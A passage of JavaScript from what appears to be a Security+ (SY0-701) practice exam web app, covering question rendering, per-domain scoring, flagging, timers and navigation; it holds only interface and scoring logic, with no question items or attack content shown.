      return `<button class="opt ${cls}" data-act="pick" data-i="${i}" ${locked ? 'aria-disabled="true"' : ""}><span class="ltr">${LET[i]}</span><span>${esc(o)}</span></button>`;
    }).join("") + `</div>`;
    if (locked) reveal = `
      <div class="reveal ${a === x.a ? "" : "miss"}" role="status">
        <b>${a === x.a ? "Correct." : "Not quite. The answer is " + LET[x.a] + "."}</b>
        <p>${esc(x.e)}</p>
        ${x.k ? `<p class="qnote">Note: ${esc(x.k)}</p>` : ""}
        ${a !== x.a ? whyBlock(x, a) : ""}
        ${srcBlock(x)}
      </div>`;
  }
  const cells = S.ids.map((qid, p) => {
    const q = Q[qid], ans = S.ans[qid]; let c = "cell";
    if (answered(q, ans)) c += study && isLocked(qid) ? (score(q, ans) === 1 ? " ok" : " bad") : " done";
    if (p === S.pos) c += " cur";
    if (S.flags[qid]) c += " fl";
    return `<button class="${c}" data-act="go" data-p="${p}" aria-label="Question ${p + 1}${answered(q, ans) ? ", answered" : ""}${S.flags[qid] ? ", flagged" : ""}">${p + 1}</button>`;
  }).join("");
  const last = S.pos === total - 1;
  const rem = S.limit - S.elapsed;
  const timer = S.mode === "exam" ? `<span id="timer" class="${rem < 300 ? "low" : ""}">${fmt(rem)}</span> <span class="label">left</span>` : `<span id="timer">${fmt(S.elapsed)}</span>`;
  return `
  <div class="stack">
    <div class="row between">
      <div class="row"><span class="label">Question ${S.pos + 1} of ${total}</span>${srcBadge(x)}<span class="chip">${x.d}.0 ${esc(DOMAINS[x.d].n)} · ${x.obj}</span></div>
      <div class="mono" aria-label="Timer">${timer}</div>
    </div>
    <div class="bar" role="progressbar" aria-valuemin="0" aria-valuemax="${total}" aria-valuenow="${nAnswered()}"><i style="width:${nAnswered() / total * 100}%"></i></div>
    <div class="card stack">
      ${isPbq(x) ? `<h2 style="font-size:1.25rem">${esc(x.title)}</h2>` : ""}
      <p class="qtext">${esc(x.text)}</p>
      ${x.fig ? `<div class="fig">${x.fig}</div>` : ""}
      ${x.n ? `<p class="qnote">Note: ${esc(x.n)}</p>` : ""}
      ${body}
      ${reveal}
      <div class="row between">
        <div class="row">
          <button class="btn" data-act="prev" ${S.pos === 0 ? "disabled" : ""}>Back</button>
          <button class="btn ${S.flags[id] ? "flag-on" : ""}" data-act="flag" aria-pressed="${!!S.flags[id]}">${S.flags[id] ? "Flagged" : "Flag"}</button>
        </div>
        ${last ? `<button class="btn primary" data-act="finish">Finish and score</button>` : `<button class="btn primary" data-act="next">Next</button>`}
      </div>
    </div>
    <div class="card stack">
      <div class="row between"><div class="label">Jump to a question</div><button class="btn" data-act="finish">Finish and score</button></div>
      <div class="grid">${cells}</div>
      <div class="legend">
        <span><i class="sw" style="background:var(--accent-soft);border-color:var(--accent)"></i>Answered</span>
        ${study ? `<span><i class="sw" style="background:var(--ok-soft);border-color:var(--ok)"></i>Correct</span><span><i class="sw" style="background:var(--bad-soft);border-color:var(--bad)"></i>Wrong</span>` : ""}
        <span><i class="sw" style="background:var(--flag)"></i>Flagged</span>
      </div>
      ${S.confirm ? `<div class="confirm stack" role="alert">
        <div><b>${unanswered} question${unanswered === 1 ? " is" : "s are"} unanswered.</b> Skipped questions count as wrong. Finish anyway?</div>
        <div class="row"><button class="btn primary" data-act="finish-yes">Finish and score</button><button class="btn" data-act="finish-no">Keep going</button></div>
      </div>` : ""}
    </div>
  </div>`;
}

function resultsView() {
  const ids = S.ids; let total = 0; const byD = {};
  ids.forEach(id => {
    const x = Q[id], sc = score(x, S.ans[id]); total += sc;
    const b = byD[x.d] = byD[x.d] || { c: 0, n: 0 }; b.n++; b.c += sc;
  });
  const n1 = v => Number.isInteger(v) ? String(v) : v.toFixed(1);
  const pct = Math.round(total / ids.length * 100);
  const missed = ids.filter(id => score(Q[id], S.ans[id]) < 1);
  const skipped = ids.filter(id => !answered(Q[id], S.ans[id])).length;
  const flagged = ids.filter(id => S.flags[id]);
  const base = S.filter === "missed" ? missed : S.filter === "flagged" ? flagged : ids;
  const list = base.filter(id => inSrc(Q[id], S.src));
  const bar = (p) => p >= 80 ? "hi" : p >= 60 ? "mid" : "low";
  const db = Object.keys(DOMAINS).filter(d => byD[d]).map(d => {
    const b = byD[d], p = Math.round(b.c / b.n * 100);
    return `<div class="tbar"><span>${d}.0 ${DOMAINS[d].n}</span><div class="bar"><i class="${bar(p)}" style="width:${p}%"></i></div><span class="mono" style="text-align:right">${n1(b.c)}/${b.n}</span></div>`;
  }).join("");
  const items = list.map(id => {
    const x = Q[id], a = S.ans[id], sc = score(x, a), ans = answered(x, a);
    const tag = !ans ? `<span class="tag skip">Skipped</span>` : sc === 1 ? `<span class="tag ok">Correct</span>` : isPbq(x) ? `<span class="tag bad">${Math.round(sc * nRows(x))} of ${nRows(x)} right</span>` : `<span class="tag bad">Missed</span>`;
    let mid;
    if (isPbq(x)) mid = pbqBody(x, a || (x.type === "match" ? x.rows.map(() => null) : undefined), "static");
    else mid = `<p class="ans"><b>Your answer:</b> ${a === undefined ? "none" : LET[a] + ") " + esc(x.o[a])}</p>
      <p class="ans"><b>Correct:</b> ${LET[x.a]}) ${esc(x.o[x.a])}</p>`;
    return `<div class="card rv">
      <div class="row between"><span class="row"><span class="label">Q${S.ids.indexOf(id) + 1} · ${x.d}.0 · ${x.obj}</span>${srcBadge(x)}</span>${tag}</div>
      ${isPbq(x) ? `<b>${esc(x.title)}</b>` : ""}
      <p style="white-space:pre-line">${esc(x.text)}</p>
      ${x.fig ? `<div class="fig">${x.fig}</div>` : ""}
      ${mid}
      <p class="ans" style="color:var(--muted)">${esc(x.e)}</p>
      ${x.n ? `<p class="qnote">Note: ${esc(x.n)}</p>` : ""}
      ${x.k ? `<p class="qnote">Note: ${esc(x.k)}</p>` : ""}
      ${!isPbq(x) && a !== x.a ? whyBlock(x, a) : ""}
      ${srcBlock(x)}
    </div>`;
  }).join("") || `<div class="card">Nothing here. ${S.filter === "missed" ? "You got every question in this view right." : "No questions match this view."}</div>`;
  const tabs = (arr, key, cur, label) => `<div class="tabs ${key === "src" ? "sub" : ""}" role="group" aria-label="${label}">${arr.map(([v, t]) => `<button class="tab" data-act="${key === "src" ? "src" : "filter"}" data-f="${v}" aria-pressed="${cur === v}">${t}</button>`).join("")}</div>`;
  return `
  <div class="stack">
    <div class="label">Results · ${S.mode === "study" ? "Study" : "Exam"} mode</div>
    <div class="card stack">
      <div class="row" style="align-items:flex-end;gap:20px"><div class="score">${pct}%</div><div style="padding-bottom:8px"><b class="mono">${n1(total)} / ${ids.length}</b> points</div></div>
      <div class="stats">
        <div class="stat"><span class="label">Not fully right</span><b>${missed.length - skipped}</b></div>
        <div class="stat"><span class="label">Skipped</span><b>${skipped}</b></div>
        <div class="stat"><span class="label">Flagged</span><b>${flagged.length}</b></div>
        <div class="stat"><span class="label">Time</span><b>${fmt(S.elapsed)}</b></div>
      </div>
      <div style="font-size:14px;color:var(--muted)">This is a raw percentage, and performance-based questions earn partial credit by row. The real exam reports a scaled score from 100 to 900 with 750 to pass, so the two numbers do not map directly. Many prep providers treat consistent scores of about 80% as a sign of readiness.</div>
    </div>
    <div class="card stack"><div class="label">By SY0-701 domain</div>${db}</div>
    <div class="row">
      ${missed.length ? `<button class="btn primary" data-act="retake">Retake ${missed.length} missed or skipped</button>` : ""}
      <button class="btn" data-act="again">New attempt</button>
    </div>
    ${tabs([["missed", `Missed (${missed.length})`], ["flagged", `Flagged (${flagged.length})`], ["all", `All (${ids.length})`]], "filter", S.filter, "Review filter")}
    ${tabs([["all", "Any type"], ["pbq", "PBQ only"]], "src", S.src, "Question type filter")}
    <div class="stack">${items}</div>
  </div>`;
}

const FOOT = `<p class="foot">Independent study tool. Not affiliated with CompTIA. CompTIA and Security+ are registered trademarks of CompTIA, Inc.</p>`;
function render() { app.innerHTML = (!S ? startView() : S.done ? resultsView() : examView()) + FOOT; }

/* ---------- actions ---------- */
function pick(i) {
  const id = S.ids[S.pos], x = Q[id];
  if (isPbq(x) || isLocked(id)) return;
  if (S.ans[id] === i) delete S.ans[id]; else S.ans[id] = i;
  save(); render();
}
function go(p) { S.pos = Math.max(0, Math.min(S.ids.length - 1, p)); S.confirm = false; save(); render(); window.scrollTo(0, 0); }
function complete() { S.done = true; S.confirm = false; save(); render(); window.scrollTo(0, 0); }
function finish() { if (S.ids.length - nAnswered() > 0) { S.confirm = true; render(); return; } complete(); }
function toggleFlag() { const id = S.ids[S.pos]; if (S.flags[id]) delete S.flags[id]; else S.flags[id] = 1; save(); render(); }

app.addEventListener("click", e => {
  if (e.target.tagName === "DIALOG") { e.target.close(); return; }
  const b = e.target.closest("[data-act]"); if (!b) return;
  const act = b.dataset.act;
  if (act === "start") {
    const mode = document.querySelector("input[name=mode]:checked").value;
    const set = document.querySelector("input[name=set]:checked").value;
    const order = document.querySelector("input[name=order]:checked").value;
    let pool = Q.filter(x => inSrc(x, set));
    if (set === "quick" || set === "full") {
      /* Quota per domain = exam weight x length: 12/22/18/28/20% -> 45: 5/10/8/13/9, 90: 11/20/16/25/18. PBQs are drawn first and count toward their domain. */
      const quota = set === "full" ? { 1: 11, 2: 20, 3: 16, 4: 25, 5: 18 } : { 1: 5, 2: 10, 3: 8, 4: 13, 5: 9 };
      const picked = [];
      shuffle(Q.filter(isPbq)).slice(0, set === "full" ? 6 : 3).forEach(x => { picked.push(x); quota[x.d]--; });
      Object.keys(quota).forEach(d => shuffle(Q.filter(x => !isPbq(x) && x.d == d)).slice(0, quota[d]).forEach(x => picked.push(x)));
      pool = picked;
    }
    let ids;
    if (order === "shuf") ids = shuffle(pool.map(x => x.id));
    else if (order === "list") ids = pool.slice().sort((p, q) => p.d - q.d || p.id - q.id).map(x => x.id);
    else ids = shuffle(pool.filter(isPbq).map(x => x.id)).concat(shuffle(pool.filter(x => !isPbq(x)).map(x => x.id)));
    newAttempt(ids, mode);
  }
  else if (act === "open") { const d = document.getElementById(b.dataset.d); if (d && d.showModal) d.showModal(); }
  else if (act === "close") { const d = b.closest("dialog"); if (d) d.close(); }
  else if (act === "resume") { S = saved; render(); }
  else if (act === "pick") pick(+b.dataset.i);
  else if (act === "next") go(S.pos + 1);
  else if (act === "prev") go(S.pos - 1);
  else if (act === "go") go(+b.dataset.p);
  else if (act === "flag") toggleFlag();
  else if (act === "check") { const id = S.ids[S.pos]; if (!S.ans[id] && Q[id].type === "order") S.ans[id] = S.ord[id].slice(); S.chk[id] = 1; save(); render(); }
  else if (act === "mv") {
    const id = S.ids[S.pos], x = Q[id]; if (isLocked(id)) return;
    const p = +b.dataset.p, d = +b.dataset.d, perm = (S.ans[id] || S.ord[id]).slice();
    if (p + d < 0 || p + d >= perm.length) return;
    [perm[p], perm[p + d]] = [perm[p + d], perm[p]];
    S.ans[id] = perm; save(); render();
    const nb = document.querySelector(`[data-act=mv][data-p="${p + d}"][data-d="${d}"]`) || document.querySelector(`[data-act=mv][data-p="${p + d}"]`); if (nb) nb.focus();
  }
  else if (act === "finish") finish();
  else if (act === "finish-yes") complete();
  else if (act === "finish-no") { S.confirm = false; render(); }
  else if (act === "filter") { S.filter = b.dataset.f; render(); }
  else if (act === "src") { S.src = b.dataset.f; render(); }
  else if (act === "retake") { const ids = S.ids.filter(id => score(Q[id], S.ans[id]) < 1); newAttempt(ids, S.mode); }
  else if (act === "again") { wipe(); saved = null; S = null; render(); window.scrollTo(0, 0); }
});

app.addEventListener("change", e => {
  const s = e.target.closest("select[data-r]"); if (!s || !S) return;
  const id = S.ids[S.pos], x = Q[id]; if (isLocked(id)) return;
  const r = +s.dataset.r, arr = (S.ans[id] || x.rows.map(() => null)).slice();
  arr[r] = s.value === "" ? null : +s.value;
  if (arr.every(v => v === null)) delete S.ans[id]; else S.ans[id] = arr;
  save(); render();
  const el = document.querySelector(`select[data-r="${r}"]`); if (el) el.focus();
});

document.addEventListener("keydown", e => {
  if (!S || S.done || e.metaKey || e.ctrlKey || e.altKey) return;
  if (e.target.closest && e.target.closest("select, input, textarea")) return;
  const k = e.key.toLowerCase();
  if (["a", "b", "c", "d"].includes(k)) pick("abcd".indexOf(k));
  else if (["1", "2", "3", "4"].includes(k)) pick(+k - 1);
  else if (e.key === "ArrowRight") go(S.pos + 1);
  else if (e.key === "ArrowLeft") go(S.pos - 1);
  else if (k === "f") toggleFlag();
});

setInterval(() => {
  if (!S || S.done) return;
  S.elapsed++;
  const t = document.getElementById("timer");
  if (S.mode === "exam") {
    const rem = S.limit - S.elapsed;
    if (rem <= 0) { complete(); return; }
    if (t) { t.textContent = fmt(rem); t.className = rem < 300 ? "low" : ""; }
  } else if (t) t.textContent = fmt(S.elapsed);
  if (S.elapsed % 10 === 0) save();
}, 1000);

saved = load();
if (saved && (!saved.ids || !saved.ids.every(i => Q[i]) || !saved.chk)) saved = null;
render();
</script>
</body>
</html>
